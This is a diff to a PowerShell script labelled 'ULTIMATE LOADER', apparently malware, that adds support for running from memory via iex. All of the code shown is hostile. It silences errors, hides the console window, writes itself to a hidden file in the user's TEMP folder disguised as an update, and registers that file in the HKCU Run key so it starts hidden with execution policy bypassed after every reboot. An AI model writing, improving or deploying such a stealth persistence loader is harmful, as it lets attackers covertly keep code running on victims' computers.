@@ -1,5 +1,5 @@
 <#
-ULTIMATE LOADER v48.0 - ENCRYPTED URL
+ULTIMATE LOADER v48.1 - FIXED FOR IEX EXECUTION
 #>
 
 $ErrorActionPreference = 'SilentlyContinue'
@@ -20,13 +20,31 @@ Add-Type -Name Window -Namespace Console -MemberDefinition '
 '
 [Console.Window]::ShowWindow([Console.Window]::GetConsoleWindow(), 0) | Out-Null
 
+# === FIX: Get current script path or content ===
+$scriptPath = $MyInvocation.MyCommand.Path
+$scriptContent = $null
+
+if ([string]::IsNullOrEmpty($scriptPath) -or $scriptPath -like "*<#>*") {
+    # We're running from iex or directly in memory
+    # Get the script content from the current invocation
+    $scriptContent = $MyInvocation.MyCommand.ScriptBlock.ToString()
+    
+    # Create a temporary file with this content
+    $tempScript = "$env:TEMP\upd_" + [guid]::NewGuid().ToString().Substring(0,8) + ".ps1"
+    $scriptContent | Out-File -FilePath $tempScript -Encoding ascii -Force
+    attrib +h $tempScript
+    Set-ItemProperty "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name $runName -Value "powershell -NoP -W Hidden -Exec Bypass -File `"$tempScript`"" -Force
+    Write-Host "✅ Installed from memory. Will run after reboot." -ForegroundColor Green
+    exit
+}
+
 # === CHECK IF RUNNING FROM TEMP ===
-$isTemp = $MyInvocation.MyCommand.Path -like "$env:TEMP\*.ps1"
+$isTemp = $scriptPath -like "$env:TEMP\*.ps1"
 
 if (-not $isTemp) {
-    # FIRST RUN: copy to TEMP and add to startup
+    # FIRST RUN from file: copy to TEMP and add to startup
     $tempScript = "$env:TEMP\upd_" + [guid]::NewGuid().ToString().Substring(0,8) + ".ps1"
-    Copy-Item $MyInvocation.MyCommand.Path $tempScript -Force
+    Copy-Item $scriptPath $tempScript -Force
     attrib +h $tempScript
     Set-ItemProperty "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name $runName -Value "powershell -NoP -W Hidden -Exec Bypass -File `"$tempScript`"" -Force
     Write-Host "✅ Installed. Will run after reboot." -ForegroundColor Green
